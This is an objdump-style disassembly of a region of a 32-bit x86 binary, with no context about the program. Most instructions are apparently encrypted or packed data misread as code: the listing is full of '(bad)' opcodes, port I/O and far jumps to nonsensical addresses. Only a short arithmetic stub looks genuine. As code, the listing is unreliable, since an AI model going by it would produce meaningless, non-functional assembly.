  40a813:	imul   ecx,DWORD PTR [esi+0x34],0x16
  40a817:	(bad)  
  40a818:	sbb    DWORD PTR [ebx-0x21],eax
  40a81b:	lea    esp,[edx]
  40a81d:	dec    ebp
  40a81e:	jl     0x40a7ab
  40a820:	sub    eax,0x70b38541
  40a825:	lods   al,BYTE PTR ds:[esi]
  40a826:	or     edi,DWORD PTR [ecx]
  40a828:	xor    ebp,DWORD PTR [ecx]
  40a82a:	fdivp  st(5),st
  40a82c:	aam    0xd6
  40a82e:	jns    0x40a7ba
  40a830:	cs pop edi
  40a832:	test   al,0xf6
  40a834:	in     eax,dx
  40a835:	aaa    
  40a836:	rol    DWORD PTR [edx+0x25339919],0xcb
  40a83d:	loop   0x40a7c0
  40a83f:	dec    esp
  40a840:	mov    edx,0xea354fe2
  40a845:	lea    eax,[esp+ecx*4-0x6b]
  40a849:	cmp    bl,BYTE PTR [eax]
  40a84b:	rcr    edi,1
  40a84d:	add    eax,0x15c643aa
  40a852:	cmc    
  40a853:	mov    edx,0x8132e80c
  40a858:	push   es
  40a859:	fisttp DWORD PTR [esi+0x95fd65]
  40a85f:	jmp    0x40a83c
  40a861:	xchg   edx,eax
  40a862:	and    cl,BYTE PTR [edx-0x7e]
  40a865:	lds    ebp,FWORD PTR [edx-0x34fe5f3a]
  40a86b:	xor    ebx,DWORD PTR [edi-0x1fa59137]
  40a871:	xor    cl,0x2f
  40a874:	inc    ebx
  40a875:	push   edx
  40a876:	ror    eax,1
  40a878:	pop    ebx
  40a879:	lods   eax,DWORD PTR ds:[esi]
  40a87a:	aas    
  40a87b:	adc    bl,BYTE PTR [edx+0x203ebbe2]
  40a881:	iret   
  40a882:	sbb    DWORD PTR ds:0x7f251d65,edi
  40a888:	mov    dl,0xa3
  40a88a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a88b:	ja     0x40a8be
  40a88d:	data16 (bad) 
  40a890:	add    al,0x49
  40a892:	inc    ebx
  40a893:	xchg   esi,eax
  40a894:	sbb    dl,BYTE PTR [ecx+0x6d]
  40a897:	jl     0x40a87e
  40a899:	mov    eax,0x7eb8124f
  40a89e:	mov    al,ds:0x7560c936
  40a8a3:	mov    DWORD PTR [edi+ebx*1],ebx
  40a8a6:	fbld   TBYTE PTR [ebx-0x47545d2c]
  40a8ac:	cs mov dl,0x62
  40a8af:	test   DWORD PTR [ebp+0x55],ebx
  40a8b2:	jge    0x40a90e
  40a8b4:	xor    ecx,0x54
  40a8b7:	pusha  
  40a8b8:	jns    0x40a8f1
  40a8ba:	xlat   BYTE PTR ds:[ebx]
  40a8bb:	outs   dx,BYTE PTR ds:[esi]
  40a8bc:	int3   
  40a8bd:	jae    0x40a86f
  40a8bf:	ja     0x40a886
  40a8c1:	mov    ebx,0xdc462d7e
  40a8c6:	neg    DWORD PTR [ebx-0x1b]
  40a8c9:	jo     0x40a908
  40a8cb:	in     al,0xd6
  40a8cd:	loope  0x40a872
  40a8cf:	mov    edx,0xdabb79ee
  40a8d4:	nop
  40a8d5:	pop    edi
  40a8d6:	loope  0x40a91c
  40a8d8:	mov    ebp,0x966ced9
  40a8dd:	ret    0xcab7
  40a8e0:	or     ecx,0xe4c1d5c7
  40a8e6:	jp     0x40a89a
  40a8e8:	loopne 0x40a8c7
  40a8ea:	mov    ecx,0x6d08cecd
  40a8ef:	mov    eax,0xad36125a
  40a8f4:	xor    DWORD PTR [ebp+0x44af1315],0x77
  40a8fb:	out    dx,al
  40a8fc:	sbb    edx,DWORD PTR [esi+0x7f]
  40a8ff:	sbb    eax,0xe0a8bed6
  40a904:	ret    
  40a905:	push   eax
  40a906:	jns    0x40a8e6
  40a908:	hlt    
  40a909:	xchg   esp,eax
  40a90a:	mov    BYTE PTR [eax],ch
  40a90c:	sbb    ch,cl
  40a90e:	pop    ebp
  40a90f:	rol    bh,0x91
  40a912:	jb     0x40a8ae
  40a914:	je     0x40a934
  40a916:	pop    ebx
  40a917:	or     DWORD PTR [edx+0x7d],ecx
  40a91a:	mov    DWORD PTR [ebp-0x2c],ebp
  40a91d:	jbe    0x40a961
  40a91f:	shl    DWORD PTR [ecx+edi*8+0x59],0x23
  40a924:	adc    al,BYTE PTR [edx-0x1c]
  40a927:	out    0xc2,eax
  40a929:	mov    dh,0xc7
  40a92b:	mov    ch,0x61
  40a92d:	xchg   BYTE PTR [eax+0x4ebe0494],cl
  40a933:	push   es
  40a934:	repz and al,0xcf
  40a937:	inc    edi
  40a938:	hlt    
  40a939:	add    al,0xf4
  40a93b:	repz mov esi,0x39ee8c27
  40a941:	xchg   ecx,eax
  40a942:	mov    dl,0x9f
  40a944:	adc    al,0xb3
  40a946:	pop    ebp
  40a947:	scas   al,BYTE PTR es:[edi]
  40a948:	into   
  40a949:	add    al,0x93
  40a94b:	pop    esp
  40a94c:	mov    esi,0x291e977b
  40a951:	adc    dh,cl
  40a953:	(bad)
  40a957:	ret    0x468e
  40a95a:	jb     0x40a9b5
  40a95c:	or     esp,DWORD PTR [edx]
  40a95e:	ds hlt 
  40a960:	adc    BYTE PTR es:[eax-0x35ebb2a8],cl
  40a967:	and    bl,cl
  40a969:	leave  
  40a96a:	xchg   ebp,eax
  40a96b:	mov    es,ebp
  40a96d:	aas    
  40a96e:	add    ah,bl
  40a970:	aas    
  40a971:	daa    
  40a972:	neg    BYTE PTR [ebx+0x4df7e3cb]
  40a978:	jmp    0x2d8afb4f
  40a97d:	dec    edx
  40a97e:	(bad)  
  40a97f:	js     0x40a9f4
  40a981:	sub    DWORD PTR [ebx+0x68],edx
  40a984:	push   0x62
  40a986:	in     eax,dx
  40a987:	mov    ds:0x8fd5457f,eax
  40a98c:	add    BYTE PTR [ebp+0x3000d838],al
  40a992:	call   0x2ae816a0
  40a997:	inc    edx
  40a998:	or     edx,DWORD PTR [eax-0x2683ed4c]
  40a99e:	mov    BYTE PTR [ecx],bl
  40a9a0:	int3   
  40a9a1:	push   cs
  40a9a2:	stos   DWORD PTR es:[edi],eax
  40a9a3:	jg     0x40a92e
  40a9a5:	cmp    dl,BYTE PTR [edx+ecx*2-0x4afd5402]
  40a9ac:	imul   ebx,DWORD PTR ds:[edx-0x1906e312],0xffffffcc
  40a9b4:	push   esp
  40a9b5:	xchg   esp,eax
  40a9b6:	cdq    
  40a9b7:	inc    eax
  40a9b8:	ffreep st(1)
  40a9ba:	das    
  40a9bb:	xor    eax,0xc3067e1c
  40a9c0:	mov    edi,esi
  40a9c2:	jg     0x40a998
  40a9c4:	xchg   ecx,eax
  40a9c5:	push   esi
  40a9c6:	retf   
  40a9c7:	je     0x40a97e
  40a9c9:	lock sbb ecx,DWORD PTR [ecx]
  40a9cc:	mov    edx,0x740daf1c
  40a9d1:	jp     0x40aa0d
  40a9d3:	mov    ah,0x16
  40a9d5:	adc    DWORD PTR [edi+0x53],0x6894d01
  40a9dc:	mov    dh,BYTE PTR [eax]
  40a9de:	inc    esp
  40a9df:	adc    al,0x80
  40a9e1:	aaa    
  40a9e2:	fcmovnu st,st(0)
  40a9e4:	jno    0x40a9b3
  40a9e6:	dec    edi
  40a9e7:	lods   eax,DWORD PTR ds:[esi]
  40a9e8:	mov    al,ds:0x8395c241
  40a9ed:	fstp   QWORD PTR fs:[eax]
  40a9f0:	pushf  
  40a9f1:	pop    es
  40a9f2:	mov    dh,0x93
  40a9f4:	jmp    0x3614:0xbf0fe810
  40a9fb:	addr16 mov ds:0x87c1,eax
  40a9ff:	cdq    
  40aa00:	cmp    BYTE PTR [ebp-0x22],dh
  40aa03:	dec    edx
  40aa04:	ret    
  40aa05:	leave  
  40aa06:	call   0x36e705c4
  40aa0b:	and    al,0x28
  40aa0d:	scas   al,BYTE PTR es:[edi]
  40aa0e:	int3   
  40aa0f:	fwait
  40aa10:	in     eax,dx
  40aa11:	nop
  40aa12:	pop    esp
  40aa13:	add    ebx,DWORD PTR [edx]
  40aa15:	pushf  
  40aa16:	in     eax,dx
  40aa17:	std    
  40aa18:	xchg   ecx,eax
  40aa19:	and    BYTE PTR [esi-0x53cb2f94],dl
  40aa1f:	mov    al,0xc9
  40aa21:	repz xchg esp,eax
  40aa23:	dec    eax
  40aa24:	push   0x5f
  40aa26:	or     dl,BYTE PTR [edx+0x5c298aa5]
  40aa2c:	xor    DWORD PTR [eax],ecx
  40aa2e:	add    al,0xc6
  40aa30:	jp     0x40aa99
  40aa32:	es add eax,0x86345121
  40aa38:	push   ss
  40aa39:	pop    ebx
  40aa3a:	xchg   ebp,eax
  40aa3b:	push   eax
  40aa3c:	repnz imul eax,DWORD PTR [edx+0x283fb7ed],0xffffffee
  40aa44:	jmp    0x2b4a49fb
  40aa49:	jge    0x40aa68
  40aa4b:	sub    DWORD PTR [edx+0x76b3f906],edx
  40aa51:	mov    esp,0xd674e238
  40aa56:	mov    ch,0x25
  40aa58:	adc    cl,bl
  40aa5a:	pusha  
  40aa5b:	mov    ch,0x7d
  40aa5d:	test   eax,0xf68bef8c
  40aa62:	iret   
  40aa63:	sub    BYTE PTR [edx-0x6e],dl
  40aa66:	xor    DWORD PTR ds:[esp+edi*1+0xa],esi
  40aa6b:	pop    ds
  40aa6c:	sub    edi,edi
  40aa6e:	push   ds
  40aa6f:	xchg   BYTE PTR [edx+0x1f],ch
  40aa72:	push   cs
  40aa73:	mov    ds:0x92178588,al
  40aa78:	fsub   st,st(7)
  40aa7a:	push   es
  40aa7b:	in     al,0x41
  40aa7d:	jo     0x40aaf5
  40aa7f:	aam    0x3e
  40aa81:	out    0x43,eax
  40aa83:	rol    DWORD PTR cs:[ebx-0x2eabfb1b],0x1a
  40aa8b:	jp     0x40aab0
  40aa8d:	in     eax,dx
  40aa8e:	mov    ah,0xdf
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xb9aa90bc
  40aacc:	rcl    BYTE PTR [esp+esi*8+0x62],cl
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x1a]
  40aad6:	fist   WORD PTR [edx-0x3f0da876]
  40aadc:	dec    esp
  40aadd:	mov    BYTE PTR [ebp-0x51],bh
  40aae0:	in     al,0x78
  40aae2:	js     0x40ab5b
  40aae4:	iret   
  40aae5:	push   ecx
  40aae6:	pop    ebp
  40aae7:	or     eax,0xa1da65ab
  40aaec:	(bad)  
  40aaed:	xor    al,0x70
  40aaef:	fwait
  40aaf0:	mov    ecx,0x5340985a
  40aaf5:	mov    eax,ds:0x5c8d8fe4
  40aafa:	and    BYTE PTR [ebx-0x2fb2b074],al
  40ab00:	xor    eax,0x4b9c3fec
  40ab05:	in     al,dx
  40ab06:	jmp    0xb67d:0xc8efad38
  40ab0d:	fnstenv [edi]
  40ab0f:	jmp    0x23c312e2
  40ab14:	scas   al,BYTE PTR es:[edi]
  40ab15:	sub    al,0x72
  40ab17:	mov    BYTE PTR [eax-0x76e6ffca],bl
  40ab1d:	pusha  
  40ab1e:	gs ret 
  40ab20:	pop    ebp
  40ab21:	fmul   DWORD PTR [edi-0x70871254]
  40ab27:	and    ecx,DWORD PTR [edi]
  40ab29:	pusha  
  40ab2a:	pop    edi
  40ab2b:	out    dx,eax
  40ab2c:	leave  
  40ab2d:	cmp    eax,0x3f10d681
  40ab32:	(bad)  
  40ab33:	aas    
  40ab34:	outs   dx,DWORD PTR ds:[esi]
  40ab35:	outs   dx,BYTE PTR ds:[esi]
  40ab36:	push   es
  40ab37:	jmp    0xc4ca:0x749243cb
  40ab3e:	aaa    
  40ab3f:	lods   al,BYTE PTR ds:[esi]
  40ab40:	sbb    eax,0x8f34de33
  40ab45:	sub    BYTE PTR [edi+0x3],bh
  40ab48:	adc    al,0x35
  40ab4a:	in     al,dx
  40ab4b:	gs push 0x1e
  40ab4e:	push   eax
  40ab4f:	ror    BYTE PTR ds:0xf45a9f4e,cl
  40ab55:	jecxz  0x40ab16
  40ab57:	imul   ecx,DWORD PTR [edi+0x1b6a1b4],0x5cd5625a
  40ab61:	sbb    eax,0x4de36d34
  40ab66:	xchg   edi,eax
  40ab67:	jmp    0x40abde
  40ab69:	sbb    BYTE PTR [ebx+0x7e4599a0],ah
  40ab6f:	jnp    0x40ab2e
  40ab71:	outs   dx,DWORD PTR ds:[esi]
  40ab72:	or     ecx,edi
  40ab74:	pop    ss
  40ab75:	mov    dl,0xae
  40ab77:	add    DWORD PTR [edx],esi
  40ab79:	scas   eax,DWORD PTR es:[edi]
  40ab7a:	ret    0x5917
  40ab7d:	(bad)  
  40ab7e:	mov    ds:0xf0a378f2,eax
  40ab83:	or     edi,edx
  40ab85:	bound  ebp,QWORD PTR [ebp+0xc18152d]
  40ab8b:	scas   eax,DWORD PTR es:[edi]
  40ab8c:	leave  
  40ab8d:	cs pop ss
  40ab8f:	(bad)  
  40ab90:	dec    esp
  40ab91:	(bad)  
  40ab92:	mov    ebp,0xd30cabfe
  40ab97:	xchg   ebx,eax
  40ab98:	(bad)  
  40ab99:	or     al,0xc0
  40ab9b:	fistp  DWORD PTR ds:0xf934a843
  40aba1:	adc    DWORD PTR [ebp+0x6f1970fa],0xfffffffc
  40aba8:	rcl    DWORD PTR [ecx-0x838c4ef],0xdf
  40abaf:	and    al,0xb
  40abb1:	xor    al,cl
  40abb3:	and    edx,DWORD PTR [eax+0x12]
  40abb6:	add    al,0xd9
  40abb8:	rep outs dx,BYTE PTR ds:[esi]
  40abba:	jge    0x40abec
  40abbc:	push   ss
  40abbd:	cwde   
  40abbe:	jb     0x40ab5b
  40abc0:	in     al,0x9b
  40abc2:	dec    eax
  40abc3:	xchg   edx,eax
  40abc4:	inc    esi
  40abc5:	sub    DWORD PTR [ecx],0xbffc5fcc
  40abcb:	pop    ecx
  40abcc:	jmp    0x81bd34cb
  40abd1:	ror    DWORD PTR [eax-0x76],0xb3
  40abd5:	mov    ecx,0xa4649e65
  40abda:	jnp    0x40abd1
  40abdc:	dec    eax
  40abdd:	in     eax,dx
  40abde:	dec    eax
  40abdf:	js     0x40abef
  40abe1:	adc    esi,esi
  40abe3:	ins    BYTE PTR es:[edi],dx
  40abe4:	mov    eax,ds:0xccd6a1a0
  40abe9:	mov    ebx,0x5e473305
  40abee:	ja     0x40ab8b
  40abf0:	cmp    ch,BYTE PTR [edx]
  40abf2:	mov    eax,ds:0xefe29ed7
  40abf7:	add    ecx,DWORD PTR [edx+0x28]
  40abfa:	(bad)  
  40abfb:	pop    edi
  40abfc:	and    ecx,ecx
  40abfe:	sub    al,dh
  40ac00:	outs   dx,DWORD PTR ds:[esi]
  40ac01:	lea    esp,[edi-0x3956b218]
  40ac07:	xchg   ebp,eax
  40ac08:	mov    ds:0x5e34e802,al
  40ac0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac0e:	cdq    
  40ac0f:	ins    BYTE PTR es:[edi],dx
  40ac10:	(bad)  
  40ac11:	js     0x40abc4
  40ac13:	dec    edi
  40ac14:	in     eax,dx
  40ac15:	(bad)  
  40ac16:	sbb    al,0x2a
  40ac18:	mov    al,0x31
  40ac1a:	pop    es
  40ac1b:	call   0x4430:0xb6a06ea2
  40ac22:	adc    BYTE PTR [edi+0x1e],dh
  40ac25:	and    DWORD PTR [edi-0x2d],ebp
  40ac28:	inc    ecx
  40ac29:	push   eax
  40ac2a:	test   DWORD PTR [eax+eax*8],ebx
  40ac2d:	js     0x40abe0
  40ac2f:	mul    BYTE PTR [edx]
  40ac31:	sar    DWORD PTR [ecx-0xaccb5a],cl
  40ac37:	fs sbb ch,dl
  40ac3a:	and    bh,BYTE PTR [esi-0x7f9fa807]
  40ac40:	sub    ch,BYTE PTR ds:0x6051f10b
  40ac46:	sub    BYTE PTR [edi+0x16],0x4d
  40ac4a:	into   
  40ac4b:	repnz lds edx,FWORD PTR [esi+eax*4+0x639416a]
  40ac53:	fcmovnbe st,st(6)
  40ac55:	aad    0xb8
  40ac57:	jl     0x40ac96
  40ac59:	popa   
  40ac5a:	push   cs
  40ac5b:	retf   0xb88
  40ac5e:	mov    esp,0xbebb903a
  40ac63:	iret   
  40ac64:	sbb    al,0x94
  40ac66:	sub    cl,BYTE PTR [edx]
  40ac68:	test   eax,0x9b25c9ea
  40ac6d:	rcl    DWORD PTR [esi+esi*8],cl
  40ac70:	stos   DWORD PTR es:[edi],eax
  40ac71:	cdq    
  40ac72:	retf   
  40ac73:	sbb    al,cl
  40ac75:	sahf   
  40ac76:	sub    edi,esp
  40ac78:	cli    
  40ac79:	outs   dx,DWORD PTR ds:[esi]
  40ac7a:	lea    ebx,[edx]
  40ac7c:	add    DWORD PTR [edx-0x73],esp
  40ac7f:	lahf   
  40ac80:	pop    ds
  40ac81:	stos   DWORD PTR es:[edi],eax
  40ac82:	sbb    BYTE PTR [esi-0x5e],dh
  40ac85:	test   eax,0x6aa650b1
  40ac8a:	scas   eax,DWORD PTR es:[edi]
  40ac8b:	or     esp,esp
  40ac8d:	aam    0x68
  40ac8f:	outs   dx,BYTE PTR ds:[esi]
  40ac90:	or     al,0xe0
  40ac92:	in     eax,0x21
  40ac94:	imul   cl
  40ac96:	ret    0xf01c
  40ac99:	and    edi,ebx
  40ac9b:	cwde   
  40ac9c:	test   ch,ch
  40ac9e:	xchg   ecx,eax
  40ac9f:	push   es
  40aca0:	sar    BYTE PTR [eax+0x12],0x4d
  40aca4:	fwait
  40aca5:	test   eax,0x9ef3cbbe
  40acaa:	sbb    esi,DWORD PTR [ebp+0x10]
  40acad:	sub    ah,BYTE PTR [esi-0x64]
  40acb0:	je     0x40ac70
  40acb2:	test   BYTE PTR [esi-0x29],bl
  40acb5:	and    dh,BYTE PTR [ecx+0x6d]
  40acb8:	inc    ecx
  40acb9:	add    eax,0x1a99f2ce
  40acbe:	dec    esp
  40acbf:	push   ecx
  40acc0:	xor    eax,0x5209ddc7
  40acc5:	mov    esi,es
  40acc7:	lds    edi,FWORD PTR [ebp+0x28]
  40acca:	repz int 0x9d
  40accd:	mov    bl,ch
  40accf:	mov    cl,0x31
  40acd1:	xchg   ecx,edi
  40acd3:	cmp    bl,BYTE PTR [edi+0x37]
  40acd6:	outs   dx,DWORD PTR ds:[esi]
  40acd7:	mov    ?,WORD PTR [edx+0x16]
  40acda:	pop    es
  40acdb:	imul   ebx,DWORD PTR [edi],0x45
  40acde:	and    eax,0x1e6c5a3a
  40ace3:	and    DWORD PTR ds:0xd8e74d92,ebx
  40ace9:	in     al,0x7c
  40aceb:	mov    cl,0x4
  40aced:	sub    al,0xd9
  40acef:	pop    ecx
  40acf0:	in     eax,dx
  40acf1:	ins    BYTE PTR es:[edi],dx
  40acf2:	outs   dx,BYTE PTR ds:[esi]
  40acf3:	push   ecx
  40acf4:	dec    edi
  40acf5:	xor    cx,WORD PTR [esi+0x30]
  40acf9:	pop    esp
  40acfa:	adc    dl,ch
  40acfc:	pusha  
  40acfd:	ds in  al,dx
  40acff:	pop    ecx
  40ad00:	(bad)  
  40ad01:	shl    BYTE PTR [esi-0x46],cl
  40ad04:	fdiv   QWORD PTR [ebp+0x3d7c8355]
  40ad0a:	adc    DWORD PTR [ebx+eiz*4],esi
  40ad0d:	cmp    ecx,edi
  40ad0f:	jp     0x40ad1b
  40ad11:	dec    esp
  40ad12:	or     DWORD PTR ds:0xd4f978ed,edi
  40ad18:	mov    ecx,0xd3e40644
  40ad1d:	daa    
  40ad1e:	jns    0x40ad47
  40ad20:	xchg   ebp,eax
  40ad21:	call   0x9a5ba725
  40ad26:	sar    WORD PTR [edx+0x6dcd46df],cl
  40ad2d:	aas    
  40ad2e:	mov    esi,0xec9a66d6
  40ad33:	nop
  40ad34:	aad    0x4
  40ad36:	jmp    DWORD PTR [ecx]
  40ad38:	mov    bh,0xe0
  40ad3a:	pusha  
  40ad3b:	cmp    DWORD PTR [edi],ebp
  40ad3d:	xchg   ebp,eax
  40ad3e:	cwde   
  40ad3f:	adc    cl,cl
  40ad41:	push   0xffffffab
  40ad43:	int3   
  40ad44:	in     eax,0xf6
  40ad46:	mov    eax,0xbb77270b
  40ad4b:	clc    
  40ad4c:	dec    ecx
  40ad4d:	arpl   dx,dx
  40ad4f:	in     eax,0x18
  40ad51:	push   ds
  40ad52:	sbb    al,0xc0
  40ad54:	sub    al,0xf2
  40ad56:	sbb    eax,DWORD PTR [edx+0x1e858f52]
  40ad5c:	mov    dl,0x88
  40ad5e:	cmp    ecx,DWORD PTR [edx]
  40ad60:	neg    DWORD PTR [ebx+0x69]
  40ad63:	sahf   
  40ad64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad65:	out    0xa7,al
  40ad67:	and    ebp,DWORD PTR [esi-0x4de6ccf9]
  40ad6d:	aas    
  40ad6e:	ss mov al,ch
  40ad71:	jns    0x40ad07
  40ad73:	mov    DWORD PTR [esp+eiz*4],0x525142b3
  40ad7a:	xor    al,0xf6
  40ad7c:	out    dx,eax
  40ad7d:	or     DWORD PTR [ecx+0x66],eax
  40ad80:	dec    ecx
  40ad81:	or     ecx,DWORD PTR [edi]
  40ad83:	lds    ebx,FWORD PTR [edx-0x23ae2036]
  40ad89:	xchg   edx,eax
  40ad8a:	icebp  
  40ad8b:	loope  0x40ad56
  40ad8d:	pop    es
  40ad8e:	xchg   ecx,eax
  40ad8f:	rol    BYTE PTR [edx+0x32],1
  40ad92:	jle    0x40ad2d
  40ad94:	bound  ecx,QWORD PTR [esi-0x5cf614d0]
  40ad9a:	mov    edx,0x10cf1622
  40ad9f:	aas    
  40ada0:	stos   DWORD PTR es:[edi],eax
  40ada1:	pop    ebx
  40ada2:	xchg   edi,eax
  40ada3:	leave  
  40ada4:	or     DWORD PTR [eax-0x16a64876],esp
  40adaa:	outs   dx,DWORD PTR ds:[esi]
  40adab:	call   0xb7cd000e
  40adb0:	lods   eax,DWORD PTR ds:[esi]
  40adb1:	(bad)  
  40adb2:	mov    cl,0x43
  40adb4:	pop    ds
  40adb5:	stos   DWORD PTR es:[edi],eax
  40adb6:	adc    edi,DWORD PTR [edx-0x70d65e8b]
  40adbc:	frstor [esp+eiz*2+0x750c79dd]
  40adc3:	out    dx,eax
  40adc4:	lods   eax,DWORD PTR ds:[esi]
  40adc5:	(bad)  [ebx+eax*8-0x6f]
  40adc9:	popa   
  40adca:	bound  eax,QWORD PTR [edx-0x7]
  40adcd:	dec    ebp
  40adce:	mov    cl,0x53
  40add0:	pop    esp
  40add1:	mov    al,0x3b
  40add3:	cmp    al,dh
  40add5:	aad    0x2
  40add7:	adc    ebx,DWORD PTR [ebp+0x61]
  40adda:	(bad)  [esi+0x200e5043]
  40ade0:	pop    esp
  40ade1:	repnz cdq 
  40ade3:	jb     0x40adf9
  40ade5:	add    DWORD PTR [edi-0x33d759be],ebx
  40adeb:	cwde   
  40adec:	sti    
  40aded:	enter  0xec21,0xb9
  40adf1:	in     eax,dx
  40adf2:	inc    DWORD PTR [esi+0x5a]
  40adf5:	xor    BYTE PTR [edi-0x143287ac],dh
  40adfb:	ss icebp 
  40adfd:	(bad)  
  40adfe:	gs jno 0x40adab
  40ae01:	mov    cl,0x23
  40ae03:	ffree  st(0)
  40ae05:	xchg   DWORD PTR [ebx],edi
  40ae07:	push   edx
  40ae08:	imul   esi,DWORD PTR [ebx+0x4a],0x6
  40ae0c:	es mov ecx,0x383e1d3e
  40ae12:	pop    edi
  40ae13:	mov    dl,0x34
  40ae15:	sbb    ch,BYTE PTR [ecx]
  40ae17:	cmp    ebx,DWORD PTR [edx+ebx*8-0x8]
  40ae1b:	cmp    al,0x8e
  40ae1d:	and    al,0x6
  40ae1f:	inc    ebx
  40ae20:	adc    eax,0x41e3c3a4
  40ae25:	das    
  40ae26:	icebp  
  40ae27:	adc    ebp,esi
  40ae29:	lea    esp,[eax+0x4236dffc]
  40ae2f:	sbb    BYTE PTR [ecx],ah
  40ae31:	aaa    
  40ae32:	mov    edi,DWORD PTR [edi]
  40ae34:	js     0x40ae1f
  40ae36:	sub    BYTE PTR [ebp-0x18],ch
  40ae39:	fdivr  st(5),st
  40ae3b:	mov    fs,WORD PTR [esp+ebp*1-0x47acdb90]
  40ae42:	and    BYTE PTR [ebp+0x48],bl
  40ae45:	inc    esi
  40ae46:	push   esi
  40ae47:	and    al,0x2d
  40ae49:	loope  0x40ae0f
  40ae4b:	rdtsc  
  40ae4d:	lock inc esi
  40ae4f:	or     BYTE PTR [edx],ah
  40ae51:	push   eax
  40ae52:	mov    WORD PTR [eax],ss
  40ae54:	push   ecx
  40ae55:	inc    eax
  40ae56:	out    dx,al
  40ae57:	xchg   ebx,eax
  40ae58:	inc    ebx
  40ae59:	(bad)  
  40ae5a:	mov    ch,0xec
  40ae5c:	mov    ch,0x73
  40ae5e:	(bad)  
  40ae5f:	stc    
  40ae60:	or     BYTE PTR [ecx+0x17],ch
  40ae63:	out    0xcf,eax
  40ae65:	dec    ebp
  40ae66:	xor    ecx,DWORD PTR [ebp-0x3a]
  40ae69:	push   0x718836fd
  40ae6e:	jmp    0x26de:0x14bef57a
  40ae75:	mov    BYTE PTR [ecx-0x24],bh
  40ae78:	xchg   esi,eax
  40ae79:	xchg   esi,eax
  40ae7a:	jg     0x40aef9
  40ae7c:	adc    BYTE PTR [edi+0x106d9878],0x6e
  40ae83:	or     eax,0xbff556d3
  40ae88:	fidiv  DWORD PTR [esi-0x5d]
  40ae8b:	ja     0x40aeeb
  40ae8d:	sub    eax,0x1244d66e
  40ae92:	imul   ebp,DWORD PTR [edx],0x7e3c2fa0
  40ae98:	shl    al,0x85
  40ae9b:	push   0xffffffba
  40ae9d:	xchg   ecx,eax
  40ae9e:	cmp    esp,DWORD PTR [esi]
  40aea0:	repnz pop ds
  40aea2:	xchg   DWORD PTR [eax],ebp
  40aea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea5:	test   esi,eax
  40aea7:	sbb    dh,BYTE PTR [eax-0x27]
  40aeaa:	mov    ch,0x2f
  40aeac:	into   
  40aead:	and    ch,0x89
  40aeb0:	pop    esp
  40aeb1:	cli    
  40aeb2:	idiv   DWORD PTR [esi-0x34]
  40aeb5:	pop    es
  40aeb6:	inc    esi
  40aeb7:	fadd   QWORD PTR [edx]
  40aeb9:	fisub  DWORD PTR [edx-0x29]
  40aebc:	and    eax,0xf544c99a
  40aec1:	ss das 
  40aec3:	mov    edx,0x812f0362
  40aec8:	xor    al,0x55
  40aeca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aecb:	mov    eax,ds:0x1c253f9
  40aed0:	sbb    DWORD PTR [esp+eiz*4],0x73
  40aed4:	jbe    0x40aefb
  40aed6:	int3   
  40aed7:	retf   
  40aed8:	pop    ss
  40aed9:	dec    ebx
  40aeda:	xchg   edx,eax
  40aedb:	push   ebp
  40aedc:	push   cs
  40aedd:	pop    esp
  40aede:	(bad)  
  40aedf:	call   0x98bb221e
  40aee4:	mov    esi,0x2346098
  40aee9:	pushf  
  40aeea:	push   ebx
  40aeeb:	mov    ebx,0xdfa9620c
  40aef0:	cwde   
  40aef1:	push   esp
  40aef2:	push   cs
  40aef3:	icebp  
  40aef4:	cs mov ax,0xfb3c
  40aef9:	nop
  40aefa:	add    dl,BYTE PTR [ebx-0x2]
  40aefd:	jmp    0xf1fa:0xcc6c4b88
  40af04:	cld    
  40af05:	sbb    al,0xe4
  40af07:	adc    eax,0x8edaa742
  40af0c:	sbb    BYTE PTR [edi+0x20aff95a],dh
  40af12:	or     al,0x18
  40af14:	adc    al,0xc8
  40af16:	aam    0xb8
  40af18:	jmp    0x5ccf:0x7f4337f2
  40af1f:	data16 ss jb 0x40aeef
  40af23:	jecxz  0x40af8c
  40af25:	mov    al,ds:0xd2682303
  40af2a:	mov    edi,0xa668ef2e
  40af2f:	or     DWORD PTR [edx-0x7d],ecx
  40af32:	pop    eax
  40af33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af34:	cmp    bl,al
  40af36:	out    dx,al
  40af37:	sbb    eax,ecx
  40af39:	ja     0x40af1c
  40af3b:	ret    
  40af3c:	add    BYTE PTR [edi+0x797b90e2],ch
  40af42:	xchg   esi,eax
  40af43:	jnp    0x40af4f
  40af45:	push   0x58
  40af47:	int    0xe4
  40af49:	mov    ds:0xb5cc3788,eax
  40af4e:	or     DWORD PTR [ebp+ebx*2+0x138f01bb],edi
  40af55:	push   esp
  40af56:	loop   0x40af8d
  40af58:	(bad)  
  40af59:	jbe    0x40af9d
  40af5b:	cmp    eax,DWORD PTR [esi+0x241a5183]
  40af61:	es (bad) 
  40af63:	mov    ah,0x86
  40af65:	shr    ecx,0x86
  40af68:	std    
  40af69:	jno    0x40af19
  40af6b:	leave  
  40af6c:	xchg   ebx,eax
  40af6d:	cwde   
  40af6e:	pop    edi
  40af6f:	mov    eax,ds:0x4bfabecc
  40af74:	mov    ah,0x95
  40af76:	lods   eax,DWORD PTR ds:[esi]
  40af77:	rol    BYTE PTR [esi-0x76f283c3],1
  40af7d:	push   edx
  40af7e:	xchg   ebp,eax
